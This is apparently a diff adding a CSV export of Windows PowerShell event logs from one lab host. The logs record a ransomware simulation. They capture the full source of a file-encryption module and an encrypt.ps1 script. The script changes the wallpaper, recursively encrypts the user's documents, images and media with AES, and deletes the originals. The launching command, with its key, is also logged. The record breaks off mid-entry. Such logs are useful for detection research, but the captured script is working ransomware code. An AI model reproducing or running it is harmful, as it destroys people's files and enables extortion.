+                $FileStreamReader.Seek(4, [System.IO.SeekOrigin]::Begin) | Out-Null
+                $FileStreamReader.Read($IV, 0, $LIV) | Out-Null
+                $Crypto.IV = $IV
+
+                #Peform Decryption
+                $Transform = $Crypto.CreateDecryptor()
+                $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($FileStreamWriter, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write)
+                $FileStreamReader.CopyTo($CryptoStream)
+
+                #Close open files
+                $CryptoStream.FlushFinalBlock()
+                $CryptoStream.Close()
+                $FileStreamReader.Close()
+                $FileStreamWriter.Close()
+
+                #Delete encrypted file
+                if($RemoveSource){Remove-Item $File.FullName}
+
+                #Output decrypted file
+                Get-Item $DestinationFile | Add-Member –MemberType NoteProperty –Name SourceFile –Value $File.FullName -PassThru
+            }
+            Catch
+            {
+                Write-Error $_
+                If($FileStreamWriter)
+                {
+                    #Remove failed file
+                    $FileStreamWriter.Close()
+                    Remove-Item -LiteralPath $DestinationFile -Force
+                }
+                Continue
+            }
+            Finally
+            {
+                if($CryptoStream){$CryptoStream.Close()}
+                if($FileStreamReader){$FileStreamReader.Close()}
+                if($FileStreamWriter){$FileStreamWriter.Close()}
+            }
+        }
+    }
+}
+
+Export-ModuleMember -Function New-CryptographyKey
+Export-ModuleMember -Function Protect-File
+Export-ModuleMember -Function Unprotect-File
+
+ScriptBlock ID: 37d15d5a-74c1-4070-818d-d8fc3aaf5942
+Path: C:\Users\zhongli\Downloads\ransom\FileCryptography.psm1",-,-,-,-,-,-,-,-,-,-,37d15d5a-74c1-4070-818d-d8fc3aaf5942,"function New-CryptographyKey()
+{
+<#
+.SYNOPSIS 
+Generates a random cryptography key.
+
+.DESCRIPTION
+Generates a random cryptography key based on the desired key size.
+
+.PARAMETER Algorithm
+Algorithm to generate key for.
+
+.PARAMETER KeySize
+Number of bits the generated key will have.
+
+.PARAMETER AsPlainText
+Returns a String instead of SecureString.
+
+.OUTPUTS
+System.Security.SecureString. New-CryptographyKey return the key as a SecureString by default.
+System.String. New-CryptographyKey will return the key in plain text as a string if the -AsPlainText parameter is specified.
+
+.EXAMPLE
+$key = New-CryptographyKey
+This example generates a random 256-bit AES key and stores it in the variable $key.
+
+.NOTES
+Author: Tyler Siegrist
+Date: 9/22/2017
+#>
+[CmdletBinding()]
+[OutputType([System.Security.SecureString])]
+[OutputType([String], ParameterSetName='PlainText')]
+Param(
+    [Parameter(Mandatory=$false, Position=1)]
+    [ValidateSet('AES','DES','RC2','Rijndael','TripleDES')]
+    [String]$Algorithm='AES',
+    [Parameter(Mandatory=$false, Position=2)]
+    [Int]$KeySize,
+    [Parameter(ParameterSetName='PlainText')]
+    [Switch]$AsPlainText
+)
+    Process
+    {
+        try
+        {
+            $Crypto = [System.Security.Cryptography.SymmetricAlgorithm]::Create($Algorithm)
+            if($PSBoundParameters.ContainsKey('KeySize')){
+                $Crypto.KeySize = $KeySize
+            }
+            $Crypto.GenerateKey()
+            if($AsPlainText)
+            {
+                return [System.Convert]::ToBase64String($Crypto.Key)
+            }
+            else
+            {
+                return [System.Convert]::ToBase64String($Crypto.Key) | ConvertTo-SecureString -AsPlainText -Force
+            }
+        }
+        catch
+        {
+            Write-Error $_
+        }
+        
+    }
+}
+
+Function Protect-File
+{
+<#
+.SYNOPSIS 
+Encrypts a file using a symmetrical algorithm.
+
+.DESCRIPTION
+Encrypts a file using a symmetrical algorithm.
+
+.PARAMETER FileName
+File(s) to be encrypted.
+
+.PARAMETER Key
+Cryptography key as a SecureString to be used for encryption.
+
+.PARAMETER KeyAsPlainText
+Cryptography key as a String to be used for encryption.
+
+.PARAMETER CipherMode
+Specifies the block cipher mode to use for encryption.
+
+.PARAMETER PaddingMode
+Specifies the type of padding to apply when the message data block is shorter than the full number of bytes needed for a cryptographic operation.
+
+.PARAMETER Suffix
+Suffix of the encrypted file to be removed.
+
+.PARAMETER RemoveSource
+Removes the source (decrypted) file after encrypting.
+
+.OUTPUTS
+System.IO.FileInfo. Protect-File will return FileInfo with the SourceFile, Algorithm, Key, CipherMode, and PaddingMode as added NoteProperties
+
+.EXAMPLE
+Protect-File 'C:\secrets.txt' $key
+This example encrypts C:\secrets.txt using the key stored in the variable $key. The encrypted file would have the default extension of '.AES' and the source (decrypted) file would not be removed.
+
+.EXAMPLE
+Protect-File 'C:\secrets.txt' -Algorithm DES -Suffix '.Encrypted' -RemoveSource
+This example encrypts C:\secrets.txt with a randomly generated DES key. The encrypted file would have an extension of '.Encrypted' and the source (decrypted) file would be removed.
+
+.EXAMPLE
+Get-ChildItem 'C:\Files' -Recurse | Protect-File -Algorithm AES -Key $key -RemoveSource
+This example encrypts all of the files under the C:\Files directory using the key stored in the variable $key. The encrypted files would have the default extension of '.AES' and the source (decrypted) files would be removed.
+
+.NOTES
+Author: Tyler Siegrist
+Date: 9/22/2017
+#>
+[CmdletBinding(DefaultParameterSetName='SecureString')]
+[OutputType([System.IO.FileInfo[]])]
+Param(
+    [Parameter(Mandatory=$true, Position=1, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]
+    [Alias('PSPath','LiteralPath')]
+    [string[]]$FileName,
+    [Parameter(Mandatory=$false, Position=2)]
+    [ValidateSet('AES','DES','RC2','Rijndael','TripleDES')]
+    [String]$Algorithm = 'AES',
+    [Parameter(Mandatory=$false, Position=3, ParameterSetName='SecureString')]
+    [System.Security.SecureString]$Key = (New-CryptographyKey -Algorithm $Algorithm),
+    [Parameter(Mandatory=$true, Position=3, ParameterSetName='PlainText')]
+    [String]$KeyAsPlainText,
+    [Parameter(Mandatory=$false, Position=4)]
+    [System.Security.Cryptography.CipherMode]$CipherMode,
+    [Parameter(Mandatory=$false, Position=5)]
+    [System.Security.Cryptography.PaddingMode]$PaddingMode,
+    [Parameter(Mandatory=$false, Position=6)]
+    [String]$Suffix = "".$Algorithm"",
+    [Parameter()]
+    [Switch]$RemoveSource
+)
+    Begin
+    {
+        #Configure cryptography
+        try
+        {
+            if($PSCmdlet.ParameterSetName -eq 'PlainText')
+            {
+                $Key = $KeyAsPlainText | ConvertTo-SecureString -AsPlainText -Force
+            }
+
+            #Decrypt cryptography Key from SecureString
+            $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($Key)
+            $EncryptionKey = [System.Convert]::FromBase64String([System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR))
+
+            $Crypto = [System.Security.Cryptography.SymmetricAlgorithm]::Create($Algorithm)
+            if($PSBoundParameters.ContainsKey('CipherMode')){
+                $Crypto.Mode = $CipherMode
+            }
+            if($PSBoundParameters.ContainsKey('PaddingMode')){
+                $Crypto.Padding = $PaddingMode
+            }
+            $Crypto.KeySize = $EncryptionKey.Length*8
+            $Crypto.Key = $EncryptionKey
+        }
+        Catch
+        {
+            Write-Error $_ -ErrorAction Stop
+        }
+    }
+    Process
+    {
+        $Files = Get-Item -LiteralPath $FileName
+    
+        ForEach($File in $Files)
+        {
+            $DestinationFile = $File.FullName + $Suffix
+
+            Try
+            {
+                $FileStreamReader = New-Object System.IO.FileStream($File.FullName, [System.IO.FileMode]::Open)
+                $FileStreamWriter = New-Object System.IO.FileStream($DestinationFile, [System.IO.FileMode]::Create)
+
+                #Write IV (initialization-vector) length & IV to encrypted file
+                $Crypto.GenerateIV()
+                $FileStreamWriter.Write([System.BitConverter]::GetBytes($Crypto.IV.Length), 0, 4)
+                $FileStreamWriter.Write($Crypto.IV, 0, $Crypto.IV.Length)
+
+                #Perform encryption
+                $Transform = $Crypto.CreateEncryptor()
+                $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($FileStreamWriter, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write)
+                $FileStreamReader.CopyTo($CryptoStream)
+    
+                #Close open files
+                $CryptoStream.FlushFinalBlock()
+                $CryptoStream.Close()
+                $FileStreamReader.Close()
+                $FileStreamWriter.Close()
+
+                #Delete unencrypted file
+                if($RemoveSource){Remove-Item -LiteralPath $File.FullName}
+
+                #Output ecrypted file
+                $result = Get-Item $DestinationFile
+                $result | Add-Member –MemberType NoteProperty –Name SourceFile –Value $File.FullName
+                $result | Add-Member –MemberType NoteProperty –Name Algorithm –Value $Algorithm
+                $result | Add-Member –MemberType NoteProperty –Name Key –Value $Key
+                $result | Add-Member –MemberType NoteProperty –Name CipherMode –Value $Crypto.Mode
+                $result | Add-Member –MemberType NoteProperty –Name PaddingMode –Value $Crypto.Padding
+                $result
+            }
+            Catch
+            {
+                Write-Error $_
+                If($FileStreamWriter)
+                {
+                    #Remove failed file
+                    $FileStreamWriter.Close()
+                    Remove-Item -LiteralPath $DestinationFile -Force
+                }
+                Continue
+            }
+            Finally
+            {
+                if($CryptoStream){$CryptoStream.Close()}
+                if($FileStreamReader){$FileStreamReader.Close()}
+                if($FileStreamWriter){$FileStreamWriter.Close()}
+            }
+        }
+    }
+}
+
+Function Unprotect-File
+{
+<#
+.SYNOPSIS 
+Decrypts a file encrypted with Protect-File.
+
+.DESCRIPTION
+Decrypts a file using a provided cryptography key.
+
+.PARAMETER FileName
+File(s) to be decrypted.
+
+.PARAMETER Key
+Cryptography key as a SecureString be used for decryption.
+
+.PARAMETER KeyAsPlainText
+Cryptography key as a String to be used for decryption.
+
+.PARAMETER CipherMode
+Specifies the block cipher mode that was used for encryption.
+
+.PARAMETER PaddingMode
+Specifies the type of padding that was applied when the message data block was shorter than the full number of bytes needed for a cryptographic operation.
+
+.PARAMETER Suffix
+Suffix of the encrypted file to be removed.
+
+.PARAMETER RemoveSource
+Removes the source (encrypted) file after decrypting.
+
+.OUTPUTS
+System.IO.FileInfo. Unprotect-File will return FileInfo with the SourceFile as an added NoteProperty
+
+.EXAMPLE
+Unprotect-File 'C:\secrets.txt.AES' $key
+This example decrypts C:\secrets.txt.AES using the key stored in the variable $key. The decrypted file would remove the default extension of '.AES' and the source (encrypted) file would not be removed.
+
+.EXAMPLE
+Unprotect-File 'C:\secrets.txt.Encrypted' -Algorithm DES -Key $key -Suffix '.Encrypted' -RemoveSource
+This example decrypts C:\secrets.txt.Encrypted using DES and the key stored in the variable $key. The decrypted file would remove the extension of '.Encrypted' and the source (encrypted) file would be removed.
+
+.EXAMPLE
+Get-ChildItem 'C:\Files' -Recurse | Unprotect-File -Algorithm AES -Key $key -RemoveSource
+This example decrypts all of the files under the C:\Files directory using the key stored in the variable $key. The decrypted files would remove the default extension of '.AES' and the source (encrypted) files would be removed.
+
+.NOTES
+Author: Tyler Siegrist
+Date: 9/22/2017
+#>
+[CmdletBinding(DefaultParameterSetName='SecureString')]
+[OutputType([System.IO.FileInfo[]])]
+Param(
+    [Parameter(Mandatory=$true, Position=1, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]
+    [Alias('PSPath','LiteralPath')]
+    [string[]]$FileName,
+    [Parameter(Mandatory=$false, Position=2, ValueFromPipelineByPropertyName=$true)]
+    [ValidateSet('AES','DES','RC2','Rijndael','TripleDES')]
+    [String]$Algorithm = 'AES',
+    [Parameter(Mandatory=$true, Position=3, ValueFromPipelineByPropertyName=$true, ParameterSetName='SecureString')]
+    [System.Security.SecureString]$Key,
+    [Parameter(Mandatory=$true, Position=3, ParameterSetName='PlainText')]
+    [String]$KeyAsPlainText,
+    [Parameter(Mandatory=$false, Position=4, ValueFromPipelineByPropertyName=$true)]
+    [System.Security.Cryptography.CipherMode]$CipherMode = 'CBC',
+    [Parameter(Mandatory=$false, Position=5, ValueFromPipelineByPropertyName=$true)]
+    [System.Security.Cryptography.PaddingMode]$PaddingMode = 'PKCS7',
+    [Parameter(Mandatory=$false, Position=6)]
+    [String]$Suffix, #Assigning default value in code due to it not processing "".$Algorithm"" properly when Algorithm is ValueFromPipelineByPropertyName
+    [Parameter()]
+    [Switch]$RemoveSource
+)
+    Process
+    {
+        #Configure cryptography
+        try
+        {
+            if($PSCmdlet.ParameterSetName -eq 'PlainText')
+            {
+                $Key = $KeyAsPlainText | ConvertTo-SecureString -AsPlainText -Force
+            }
+
+            #Decrypt cryptography Key from SecureString
+            $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($Key)
+            $EncryptionKey = [System.Convert]::FromBase64String([System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR))
+
+            $Crypto = [System.Security.Cryptography.SymmetricAlgorithm]::Create($Algorithm)
+            $Crypto.Mode = $CipherMode
+            $Crypto.Padding = $PaddingMode
+            $Crypto.KeySize = $EncryptionKey.Length*8
+            $Crypto.Key = $EncryptionKey
+        }
+        Catch
+        {
+            Write-Error $_ -ErrorAction Stop
+        }
+
+        if(-not $PSBoundParameters.ContainsKey('Suffix'))
+        {
+            $Suffix = "".$Algorithm""
+        }
+
+        #Used to store successfully decrypted file names.
+        $Files = Get-Item -LiteralPath $FileName
+
+        ForEach($File in $Files)
+        {
+            #Verify file ends with supplied suffix
+            If(-not $File.Name.EndsWith($Suffix))
+            {
+                Write-Error ""$($File.FullName) does not have an extension of '$Suffix'.""
+                Continue
+            }
+
+            $DestinationFile = $File.FullName -replace ""$Suffix$""
+
+            Try
+            {
+                $FileStreamReader = New-Object System.IO.FileStream($File.FullName, [System.IO.FileMode]::Open)
+                $FileStreamWriter = New-Object System.IO.FileStream($DestinationFile, [System.IO.FileMode]::Create)
+
+                #Get IV from file
+                [Byte[]]$LenIV = New-Object Byte[] 4
+                $FileStreamReader.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
+                $FileStreamReader.Read($LenIV,  0, 3) | Out-Null
+                [Int]$LIV = [System.BitConverter]::ToInt32($LenIV,  0)
+                [Byte[]]$IV = New-Object Byte[] $LIV
+                $FileStreamReader.Seek(4, [System.IO.SeekOrigin]::Begin) | Out-Null
+                $FileStreamReader.Read($IV, 0, $LIV) | Out-Null
+                $Crypto.IV = $IV
+
+                #Peform Decryption
+                $Transform = $Crypto.CreateDecryptor()
+                $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($FileStreamWriter, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write)
+                $FileStreamReader.CopyTo($CryptoStream)
+
+                #Close open files
+                $CryptoStream.FlushFinalBlock()
+                $CryptoStream.Close()
+                $FileStreamReader.Close()
+                $FileStreamWriter.Close()
+
+                #Delete encrypted file
+                if($RemoveSource){Remove-Item $File.FullName}
+
+                #Output decrypted file
+                Get-Item $DestinationFile | Add-Member –MemberType NoteProperty –Name SourceFile –Value $File.FullName -PassThru
+            }
+            Catch
+            {
+                Write-Error $_
+                If($FileStreamWriter)
+                {
+                    #Remove failed file
+                    $FileStreamWriter.Close()
+                    Remove-Item -LiteralPath $DestinationFile -Force
+                }
+                Continue
+            }
+            Finally
+            {
+                if($CryptoStream){$CryptoStream.Close()}
+                if($FileStreamReader){$FileStreamReader.Close()}
+                if($FileStreamWriter){$FileStreamWriter.Close()}
+            }
+        }
+    }
+}
+
+Export-ModuleMember -Function New-CryptographyKey
+Export-ModuleMember -Function Protect-File
+Export-ModuleMember -Function Unprotect-File",-,-,-,-,-,-,1,1,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,S-1-5-18,-,-,-,-,-,-,{96d05236-e7e2-0007-946e-d096e2e7d801},wineventlog,Microsoft-Windows-PowerShell/Operational,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,4104.0,-,-,-,"5,032","10,568",{a0c1853b-5c40-4b15-8766-3cf1c58f985a},Microsoft-Windows-PowerShell,87.0,Execute a Remote Command,NT AUTHORITY,S-1-5-18,SYSTEM,User,-,-,-,1
+5,"Oct 25, 2022 @ 04:35:54.913",DESKTOP-32EH6N8,Execute a Remote Command,4104,powershell,-,Microsoft-Windows-PowerShell,-,info,C:\Users\zhongli\Downloads\ransom,ps1,encrypt.ps1,C:\Users\zhongli\Downloads\ransom\encrypt.ps1,C:\Users\zhongli\Downloads\ransom\encrypt.ps1,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,warning,"Creating Scriptblock text (1 of 1):
+ <#
+
+.DESCRIPTION
+    This script encrypts data using the FileCryptopgraphy module from Tyler Siegrist - https://gallery.technet.microsoft.com/scriptcenter/EncryptDecrypt-files-use-65e7ae5d
+
+.PARAMETER Encryption key
+    The plain-text AES encryption key used for encryption
+
+#>
+
+# Define parameters and their defaults
+param([string]$Key)
+
+# Define target file types
+$TargetFiles = '*.pdf','*.xls*','*.ppt*','*.doc*','*.accd*','*.rtf','*.txt','*.csv','*.jpg','*.jpeg','*.png','*.gif','*.avi','*.midi','*.mov','*.mp3','*.mp4','*.mpeg','*.mpeg2','*.mpeg3','*.mpg','*.ogg'
+
+# Define extension appended to encrypted files
+$Extension = "".encrypted""
+
+# Define target directory where all files will be encrypted
+$TargetPath = ""C:\Users\zhongli""
+
+# Import FileCryptography module
+Import-Module ""$PSScriptRoot\FileCryptography.psm1""
+
+# Change wallpaper
+$MyWallpaper = ""$PSScriptRoot\wallpaper.png""
+$code = @' 
+using System.Runtime.InteropServices; 
+namespace Win32{ 
+    
+     public class Wallpaper{ 
+        [DllImport(""user32.dll"", CharSet=CharSet.Auto)] 
+         static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; 
+         
+         public static void SetWallpaper(string thePath){ 
+            SystemParametersInfo(20,0,thePath,3); 
+         }
+    }
+ } 
+'@
+
+add-type $code 
+[Win32.Wallpaper]::SetWallpaper($MyWallpaper)
+
+# Gather all files from the target path and its subdirectories
+$FilesToEncrypt = get-childitem -path $TargetPath\* -Include $TargetFiles -Exclude *$Extension -Recurse | where { ! $_.PSIsContainer }
+$NumFiles = $FilesToEncrypt.length
+
+# Encrypt the files
+foreach ($file in $FilesToEncrypt)
+{
+    Write-Host ""Encrypting $file""
+    Protect-File $file -Algorithm AES -KeyAsPlainText $key -Suffix $Extension -RemoveSource
+}
+Write-Host ""Encrypted $NumFiles files.""
+
+exit 
+
+ScriptBlock ID: a10e4b58-3768-4b5f-8fe0-50ed5e42456b
+Path: C:\Users\zhongli\Downloads\ransom\encrypt.ps1",-,-,-,-,-,-,-,-,-,-,a10e4b58-3768-4b5f-8fe0-50ed5e42456b," <#
+
+.DESCRIPTION
+    This script encrypts data using the FileCryptopgraphy module from Tyler Siegrist - https://gallery.technet.microsoft.com/scriptcenter/EncryptDecrypt-files-use-65e7ae5d
+
+.PARAMETER Encryption key
+    The plain-text AES encryption key used for encryption
+
+#>
+
+# Define parameters and their defaults
+param([string]$Key)
+
+# Define target file types
+$TargetFiles = '*.pdf','*.xls*','*.ppt*','*.doc*','*.accd*','*.rtf','*.txt','*.csv','*.jpg','*.jpeg','*.png','*.gif','*.avi','*.midi','*.mov','*.mp3','*.mp4','*.mpeg','*.mpeg2','*.mpeg3','*.mpg','*.ogg'
+
+# Define extension appended to encrypted files
+$Extension = "".encrypted""
+
+# Define target directory where all files will be encrypted
+$TargetPath = ""C:\Users\zhongli""
+
+# Import FileCryptography module
+Import-Module ""$PSScriptRoot\FileCryptography.psm1""
+
+# Change wallpaper
+$MyWallpaper = ""$PSScriptRoot\wallpaper.png""
+$code = @' 
+using System.Runtime.InteropServices; 
+namespace Win32{ 
+    
+     public class Wallpaper{ 
+        [DllImport(""user32.dll"", CharSet=CharSet.Auto)] 
+         static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; 
+         
+         public static void SetWallpaper(string thePath){ 
+            SystemParametersInfo(20,0,thePath,3); 
+         }
+    }
+ } 
+'@
+
+add-type $code 
+[Win32.Wallpaper]::SetWallpaper($MyWallpaper)
+
+# Gather all files from the target path and its subdirectories
+$FilesToEncrypt = get-childitem -path $TargetPath\* -Include $TargetFiles -Exclude *$Extension -Recurse | where { ! $_.PSIsContainer }
+$NumFiles = $FilesToEncrypt.length
+
+# Encrypt the files
+foreach ($file in $FilesToEncrypt)
+{
+    Write-Host ""Encrypting $file""
+    Protect-File $file -Algorithm AES -KeyAsPlainText $key -Suffix $Extension -RemoveSource
+}
+Write-Host ""Encrypted $NumFiles files.""
+
+exit ",-,-,-,-,-,-,1,1,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,S-1-5-18,-,-,-,-,-,-,{96d05236-e7e2-0007-936e-d096e2e7d801},wineventlog,Microsoft-Windows-PowerShell/Operational,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,4104.0,-,-,-,"5,032","10,568",{a0c1853b-5c40-4b15-8766-3cf1c58f985a},Microsoft-Windows-PowerShell,86.0,Execute a Remote Command,NT AUTHORITY,S-1-5-18,SYSTEM,User,-,-,-,1
+6,"Oct 25, 2022 @ 04:35:54.248",DESKTOP-32EH6N8,Engine Lifecycle,400,powershell,-,PowerShell,13,start,-,-,-,-,-,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Engine state is changed from None to Available. 
+
+Details: 
+	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.1237
+	HostId=6a48ad1f-a337-4099-8934-c29e134d04a3
+	HostApplication=powershell .\encrypt.ps1 -key B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=
+	EngineVersion=5.1.19041.1237
+	RunspaceId=725da9ed-1097-4ef8-af57-8d25402ac907
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,-,-,-,-,Available,None,5.1.19041.1237,-,-,-,-,5.1.19041.1237,-,-,725da9ed-1097-4ef8-af57-8d25402ac907,-,-,"powershell, .\encrypt.ps1, -key, B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=",4,powershell .\encrypt.ps1 -key B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=,powershell .\encrypt.ps1 -key B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=,6a48ad1f-a337-4099-8934-c29e134d04a3,-,-,-,-,-,ConsoleHost,ConsoleHost,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,400.0,-,-,Info,-,-,-,PowerShell,350.0,Engine Lifecycle,-,-,-,-,-,-,-,-
+7,"Oct 25, 2022 @ 04:35:53.920",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,7,info,-,-,-,-,-,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""FileSystem"" is Started. 
+
+Details: 
+	ProviderName=FileSystem
+	NewProviderState=Started
+
+	SequenceNumber=7
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.1237
+	HostId=6a48ad1f-a337-4099-8934-c29e134d04a3
+	HostApplication=powershell .\encrypt.ps1 -key B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,-,-,-,-,-,-,-,-,-,-,-,5.1.19041.1237,FileSystem,Started,-,-,-,"powershell, .\encrypt.ps1, -key, B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=",4,powershell .\encrypt.ps1 -key B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=,powershell .\encrypt.ps1 -key B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=,6a48ad1f-a337-4099-8934-c29e134d04a3,-,-,-,-,-,ConsoleHost,ConsoleHost,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600.0,-,-,Info,-,-,-,PowerShell,347.0,Provider Lifecycle,-,-,-,-,-,-,-,-
+8,"Oct 25, 2022 @ 04:35:53.920",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,9,info,-,-,-,-,-,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Function"" is Started. 
+
+Details: 
+	ProviderName=Function
+	NewProviderState=Started
+
+	SequenceNumber=9
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.1237
+	HostId=6a48ad1f-a337-4099-8934-c29e134d04a3
+	HostApplication=powershell .\encrypt.ps1 -key B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,-,-,-,-,-,-,-,-,-,-,-,5.1.19041.1237,Function,Started,-,-,-,"powershell, .\encrypt.ps1, -key, B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=",4,powershell .\encrypt.ps1 -key B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=,powershell .\encrypt.ps1 -key B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=,6a48ad1f-a337-4099-8934-c29e134d04a3,-,-,-,-,-,ConsoleHost,ConsoleHost,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600.0,-,-,Info,-,-,-,PowerShell,348.0,Provider Lifecycle,-,-,-,-,-,-,-,-
+9,"Oct 25, 2022 @ 04:35:53.920",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,11,info,-,-,-,-,-,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Variable"" is Started. 
+
+Details: 
+	ProviderName=Variable
+	NewProviderState=Started
+
+	SequenceNumber=11
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.1237
+	HostId=6a48ad1f-a337-4099-8934-c29e134d04a3
+	HostApplication=powershell .\encrypt.ps1 -key B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
